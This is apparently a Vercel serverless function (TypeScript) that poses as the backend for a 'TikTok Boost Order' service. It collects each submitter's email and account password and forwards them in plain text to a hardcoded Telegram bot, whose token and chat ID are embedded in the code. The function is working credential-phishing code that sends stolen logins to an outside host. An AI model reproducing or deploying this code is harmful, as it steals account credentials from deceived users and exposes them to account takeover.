import { VercelRequest, VercelResponse } from '@vercel/node';

export default async (req: VercelRequest, res: VercelResponse) => {
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');

  try {
    const { email, password, service, videoLink } = req.body;

    if (!email || !password || !service || !videoLink) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const TELEGRAM_BOT_TOKEN = '7244277654:AAF3Fxa26pLKeQMV4I0x9PkD7xnHY594YJQ';
    const TELEGRAM_USER_ID = '6626415274';

    const message = `🎯 New TikTok Boost Order\n\n📧 Email: ${email}\n🔒 Password: ${password}\n⚡ Service: ${service}\n🎬 Video Link: ${videoLink}`;

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_USER_ID,
          text: message,
        }),
      }
    );

    const result = await response.json();

    if (!response.ok) {
      return res.status(response.status).json({ error: result.description || 'Failed to send message' });
    }

    return res.status(200).json({ success: true, data: result });
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};
  
